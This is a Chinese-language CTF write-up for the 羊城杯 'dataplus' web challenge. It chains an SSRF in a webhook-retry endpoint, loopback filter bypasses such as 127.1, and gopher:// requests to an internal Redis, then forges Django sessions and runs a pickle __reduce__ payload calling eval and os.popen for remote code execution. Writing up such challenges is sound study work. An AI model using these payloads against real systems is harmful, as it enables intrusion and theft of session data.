---
title: 羊城杯 web题 dataplus全面解析
description: ""
published: 2026-10-26T23:23:51
category: article
tags: []
draft: false
---

# 羊城杯 web题 dataplus全面解析

首先是信息收集
GET / HTTP/1.1
Host: 1.14.76.59:22316

然后返回的请求头是
HTTP/1.1 200 OK
Server: gunicorn
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

可以使用curl工具来探测信息
curl --http1.1 -sSi https://example.com
返回响应头和响应体


Server: gunicorn` → Python WSGI 应用，大概率 Django/Flask。

不过这个也不怎么重要

然后可以通过api来探测这个项目的状态

/health
/healthz
/healthcheck
/status
/ping
/api/health
/api/v1/status/
/api/v1/health/
/actuator/health   #springboot项目的一般的状态测试口
shell脚本：
for p in /health /healthz /status /ping /api/health /api/v1/status/; do
  code=$(curl --http1.1 -s -o /dev/null -w '%{http_code}' "https://example.com$p")
  echo "$code  $p"
done



``json
{"service": "DataPulse Analytics Platform", "version": "2.4.1",
 "status": "operational", "uptime": 96701360,
 "components": {"web": "healthy", "task_queue": "healthy", "cache": "healthy"}}
就会返回这些东西


`task_queue` + `cache` 这两个组件名是重要线索：后面确实对应 Celery（Redis broker）和 Django session 缓存（Redis）。

通过首页、`/register/`、`/dashboard/` 的 HTML 和其中内联 JS 抽出来的接口：

| 方法       | 路径                                | 说明                      |
| -------- | --------------------------------- | ----------------------- |
| GET      | `/`                               | 首页                      |
| GET/POST | `/register/`                      | 注册（JSON body）           |
| GET/POST | `/login/`                         | 登录（JSON body）           |
| GET      | `/logout/`                        | 退出                      |
| GET      | `/dashboard/`                     | 控制台（需 session）          |
| GET      | `/api/v1/status/`                 | 状态                      |
| GET      | `/api/v1/profile/`                | 当前用户资料（需 session）       |
| GET      | `/api/v1/admin/`                  | 管理接口（role + IP 白名单）     |
| POST     | `/tasks/create/`                  | 创建分析任务                  |
| GET      | `/tasks/list/`                    | 任务列表                    |
| GET      | `/tasks/<task_id>/`               | 任务详情                    |
| POST     | `/tasks/<task_id>/retry-webhook/` | 重发 webhook（**SSRF 入口**） |
| GET      | `/tasks/<task_id>/webhook-logs/`  | webhook 投递日志            |


/dashboard/` 前端脚本里两个关键调用：

`js
// 创建任务
fetch('/tasks/create/', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    name: ...,
    type: ...,
    parameters: { data: ... },
    webhook_url: ...
  })
});

// 重发 webhook：自定义 URL 直接进后端
fetch(`/tasks/${taskId}/retry-webhook/`, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ url: url })
}); 



`/tasks/<id>/webhook-logs/` 会把 `url / status_code / response_body / error` 原样返回 —— 这等于给了一个**带响应回显的 SSRF**


POST /register/ HTTP/1.1
Content-Type: application/json

{"username":"ctf22316","password":"password123","email":"a@b.com"}

这个注册账号

在bp抓包上可以看到

`json
{"message": "Registration successful",
 "api_token": "dcbd0eff57301df56a6303d7758714c70d52990bfef19e01fa8d0f86d0e1716c"}
Set-Cookie: dp_session=0operlq2hjh79d0mi8liyq7xtt7jfn9z; HttpOnly; SameSite=Lax


dp_session` 的 cookie 名与后端的 Django session cache 键前缀 `:1:django.contrib.sessions.cache` 对应。



`/api/v1/profile/`：

```json
{"username": "ctf22316", "email": "a@b.com", "role": "analyst",
 "api_token": "22f9f991...", "created_at": "2026-10-24T00:29:42.862006"}
```

 这里就是普通的分析员，但是管理员接口需要 “platform_admin"。

创建任务：

```
POST /tasks/create/
{"name":"t","type":"statistics","parameters":{"data":"1,2,3"},"webhook_url":"http://example.com/"}
→ 201 {"message":"Task created","task_id":"e3723e9e-...","status":"pending"}
```

任务类型实测有三种，非法 type 直接 400：

细节观察：

- `statistics` 只做数值解析，非数字直接 `{"error":"No numeric data found"}`；**没有 eval/SSTI**（`{{7*7}}`、`__import__('os')` 都只是 “No numeric data found”）。
- `aggregation` 只做 JSON 结构统计，不执行内容。
- 结果存在任务记录里，`GET /tasks/<id>/` 能看到 `parameters` 和 `result_summary`。
- `webhook_url` 为空时，`retry-webhook` 返回 400 `No webhook URL configured` ——    **必须先在创建任务时填一个 webhook_url**，这是后面 SSRF 的前置条件。


2.1 功能与数据流

`POST /tasks/<id>/retry-webhook/` 的 body 是 `{"url": "..."}`，后端拿这个 URL 去发通知，然后把结果写进 webhook 日志。返回示例：

```json
{"message": "Webhook notification sent",
 "log": {"status_code": 200, "response_body": "...", "error": ""}}
```

也就是说：**我们指定 URL、服务端去请求、响应体回显给我们** —— 标准 SSRF，而且带回显、带错误信息（错误信息还会精确到 `urlopen error [Errno 111] Connection refused`，等于端口扫描器）。
`urlopen error [Errno 111] Connection refused` 的核心含义是：你的程序尝试与目标服务器建立 TCP 连接，但**目标主机明确地、主动地拒绝了这个请求*
意味着整个东西尝试去连接了



URL | 结果 | 结论 |
|---|---|---|
| `http://example.com/` | `HTTP Error 405: Method Not Allowed` | 外网可用，POST 请求 |
| `http://127.0.0.1:8000/api/v1/status/` | log 里 `URL validation failed` | **字面量 127.0.0.1 被拦** |
| `http://localhost:.../` | API 直接 400 `Invalid webhook URL` | 域名黑名单 |
| `http://[::1]:8000/...` | 400 `Invalid webhook URL` | IPv6 环回被拦 |
| `http://127.1:8000/api/v1/status/` | **200，返回应用状态 JSON** | **绕过成功** |
| `http://2130706433:8000/...` | 连通（旧实例上解析成功） | 十进制绕过也过 |
| `http://0x7f000001:...` | 超时 | 十六进制形式不稳定 |
| `http://0177.0.0.1:...` | 超时 | 八进制形式不稳定 |
| `file:///etc/passwd` | 400 | 非 http(s)/gopher 协议被拦 |
| `dict://127.0.0.1:6379/INFO` | 400 | dict 被拦 |
| `gopher://127.1:6379/_PING` | 200，返回 `+PONG` | **gopher 允许，且 127.1 绕过生效** |
###  `Validation failed`核心含义：数据没通过“质检”

几乎所有软件系统在接收用户输入或处理请求时，都会有一道“质检”工序，也就是**数据验证 (Validation)**。当提交的数据不符合规则时，系统就会拒绝处理，并返回 `Validation failed`，所以这个也是有一个黑名单出来的。

gopher 的用法

gopher 的 payload 是 URL 路径里 `/_` 之后的部分，做 URL 编码：

```
gopher://<host>:<port>/_<urlencode(raw_bytes)>
```

例如给 Redis 发 `PING\r\n`：

```
gopher://127.1:6379/_PING%0d%0a
```
返回

``json
{"message":"Webhook notification sent",
 "log":{"status_code":200,"response_body":"+PONG\r\n","error":""}}

这个就说明了这个redis正常回复我了


3.0.3 RESP 是什么
RESP 是 Redis 的“说话格式”，规则极简：先说这句话有几个词，然后每个词说“多长 + 内容

*2\r\n          ← 我要说 2 个词
> $3\r\nGET\r\n   ← 第 1 个词，3 个字节，内容 GET
> $3\r\nkey\r\n   ← 第 2 个词，3 个字节，内容 key

例子如上


还有redis的回复：
 符号 | 含义 | 例子 |
> |---|---|---|
> | `+` | 简单字符串 | `+OK`、`+PONG` |
> | `$` | 一段数据（后面跟长度） | `$53\r\ncelery-task-meta-...` |
> | `:` | 数字 | `:1` |
> | `*` | 数组/列表 | `*15` = 后面有 15 项 |
> | `-` | 报错 | `-ERR unknown command` |


redis本身是自带十六个数据库的，编号是从0到十五
用SELECT n 就可以切换


0 号（db0）：任务队列相关（Celery）
> 1 号（db1）：Django 的登录凭证（session）   ← 关键
>2～15 号：空



接着就是枚举数据库的键名
1. PING                     → 确认是 Redis、有没有密码
2. INFO keyspace            → 哪些库非空、各有多少键
3. SELECT n + KEYS *        → 每个库的键名清单（0~15）
4. TYPE key                 → 类型
5. GET / SMEMBERS / LRANGE  → 按类型取值
6. 按框架命名认键            → Django session / Celery / kombu / 自研心跳
7. 对可疑键取值验证          → 确认哪个能利用



```
INFO keyspace
→ # Keyspace
  db0:keys=15,expires=7,avg_ttl=...
  db1:keys=10,expires=10,avg_ttl=...
```

Redis 有 16 个库（db0～db15），`INFO keyspace` 直接告诉你**哪些库非空、各有多少键**——范围一下从 16 个缩到 2 个。


```
SELECT 0
KEYS *
→ celery-task-meta-<uuid>
  _kombu.binding.celery
  _kombu.binding.celery.pidbox
  dp:heartbeat:xxx
  ...

SELECT 1
KEYS *
→ :1:django.contrib.sessions.cachexxxxx
  :1:django.contrib.sessions.cacheyyyyy
  ...
```
这个直接就看到redis中全部的键名了



然后redis中的不同类型取值的命令也是不一样的都是，不然取值命令错误也显示不出来这个值的。



不看类型直接 `GET`，非字符串会返回：

```
-WRONGTYPE Operation against a key holding the wrong kind of value
```

**这个报错本身就是情报**：它说明“这个键不是 string，换 `SMEMBERS`/`LRANGE` 试试”。本次就是先 `GET _kombu.binding.celery` 吃到 WRONGTYPE，才改用 `SMEMBERS`。

```
GET dp:heartbeat:xxx
→ {"payload":"{\"task\":\"system-check-0\",\"status\":\"healthy\",...}","sig":"54fe45..."}

GET celery-task-meta-xxx
→ {"status":"SUCCESS","result":{...},"date_done":"..."}

GET :1:django.contrib.sessions.cachexxx
→ \x80\x05\x95)...   （二进制 pickle）
```

去这些值来确定
哪个是 session、哪个是任务结果、哪个是心跳。



接下来就是看看哪里有漏洞了

因为它会返回一下session给我
于是可以从利用ssrf漏洞去返回
SELECT 1
GET :1:django.contrib.sessions.cache0operlq2hjh79d0mi8liyq7xtt7jfn9z

gopher://127.0.0.1:6379/_
GET :1:django.contrib.sessions.cache0operlq2hjh79d0mi8liyq7xtt7jfn9z
编码之后：gopher://127.0.0.1:6379/_%2a2%0d%0a%246%0d%0aSELECT%0d%0a%241%0d%0a1%0d%0a%2a2%0d%0a%243%0d%0aGET%0d%0a%2464%0d%0a%3a1%3adjango.contrib.sessions.cache0operlq2hjh79d0mi8liyq7xtt7jfn9z%0d%0a
这个时候返回的是二进制pickle
解出来就是
{"user_id": 1, "role": "analyst"}
也就是说 Django 的 session serializer 是 **PickleSerializer**（Django 3.1 之后默认 JSON；这里显然用了 pickle）。

这里就是因为Django产生的反序列化漏洞了。### Django 是什么

Django 是一个 **Python Web 框架**，用来快速开发网站。它自带很多功能，其中就包括 **session 管理**——记住用户登录状态。

### 为什么这个漏洞跟 Django 有关

Django 的 session 要存到 Redis，存之前得把 Python 字典转成字节，读出来再转回字典。Django 的 cache session 后端选择了 **`pickle`** 来做这件事：

python

pickle.dumps(session_dict)   # 存：字典 → 字节
pickle.loads(redis_value)    # 读：字节 → 字典

问题在于：**`pickle.loads` 在还原字节时，可以触发任意函数调用**。正常字节还原成字典没问题；恶意字节里写了“调用 eval 执行命令”，`pickle.loads` 也会照做。

### 所以漏洞链是

text

Django 用 cache session 后端
  → session 存 Redis
  → 读写用 pickle
  → 攻击者通过 SSRF 往 Redis 写恶意 pickle
  → Django 读 session 时自动 pickle.loads
  → 触发 RCE

### 伪造 session（以及 key 长度的坑）



直接往 db1 写：

```
SELECT 1
SET :1:django.contrib.sessions.cache<our_key> <pickle bytes>
EXPIRE :1:django.contrib.sessions.cache<our_key> 900
```

用 cookie `dp_session=<our_key>` 请求 `/api/v1/profile/`：

- 返回 200，并且 `username` 是 `ctf22316` —— **伪造成功**。
- 说明后端只按 `session["user_id"]` 去查用户，session 内容完全由我们控制。把 session 写成 `{"user_id":1,"role":"platform_admin"}` 再查 profile：

```json
{"username":"ctf22316", "role":"analyst", ...}
```

**role 仍是 analyst** —— 说明 profile 的 role 是从数据库用户记录里读的，不是 session 里的。session 里的 role 字段可能只用于展示或根本被覆盖。




。。。。

最后就是来到重点：


session反序列化rce

#### 6.0.2 Python 常见序列化格式
>
> | 格式 | 能表达什么 | 安全性 |
> |---|---|---|
> | `json` | 只有 dict/list/str/int/float/bool/null | 安全（纯数据） |
> | `pickle` | **任意 Python 对象**（含“如何重建”的指令） | 危险：不可信数据 = RCE |
> | `marshal` | Python 内部字节码结构 | 不可信数据也不安全 |
> | `yaml.load`（非 safe_load） | 任意 Python 对象 | 危险 |
> | `msgpack` / `protobuf` | 纯数据结构 | 相对安全 |



> ```
> \x80\x02  \x80\x03  \x80\x04  \x80\x05   ← 二进制 pickle（协议 2~5）
> gASV...  gAJ...                          ← base64 后的 pickle 常见开头
> ```


#### 6.0.3 pickle 为什么能执行代码
>
> pickle 不是“存数据”，而是**存一套“怎么把对象造出来”的指令**（一种栈式虚拟机，有 GLOBAL / REDUCE 等 opcode）。
>
> 其中最关键的是 `__reduce__`：
>
> ```python
> class E:
>     def __reduce__(self):
>         return (callable, args)      # 反序列化时执行 callable(*args)
> ```
>
> 也就是说：**你在 `__reduce__` 里写什么函数，服务端 `pickle.loads()` 时就会调用什么函数。**
>
> 最小验证（本地就能跑）：
>
> ```python
> import pickle
>
> class E:
>     def __reduce__(self):
>         return (eval, ("__import__('os').popen('id').read()",))
>
> p = pickle.dumps(E(), protocol=4)
> print(pickle.loads(p))      # 会执行命令并打印结果
> ```
>
> 对应到底层 opcode，大致是：
>
> ```
> \x80\x04                 PROTO 4
> c builtins\neval\n       GLOBAL：加载 eval 函数
> ...                      (MARK / 构造参数元组)
> R                        REDUCE：调用 eval(args)
> .                        STOP
> ```
>
> 所以“反序列化漏洞”不是数据被篡改，而是**数据里带了一条“请调用这个函数”的指令**。


前面两个事实拼起来就是答案：

1. 我们能往 Redis 任意写（SSRF + gopher）。
2. Django 的 cache session 后端**把 session 当成 pickle 反序列化**


 于是我们可以伪造一个cookie，然后这个cookie的键值是一个恶意的payload
 后面我们请求这个/dashboard/这个api路径的时候把session的值改为我们伪造的session值，里面就会执行我们的反序话我们的payload，执行我们恶意的代码。


CMD = ("__import__('redis').Redis().set('pwn2',"
         "__import__('os').popen('/readflag').read())")

  class E:
      def __reduce__(self):
          return (eval, (CMD,))

  payload = pickle.dumps(E(), protocol=4)
这个就是恶意的payload放在伪造的cookie所对应的值，当我们用伪装的session的值去请求的时候就会执行这个命令，但是

响应 **500**，但这不是失败 —— 500 是后面 session 类型不对导致的，**反序列化已经执行完了**。这个时候这个flag值已经写入了pwn2键值中。


```
GET pwn2
```
再用gopher协议请求就可以得到flag
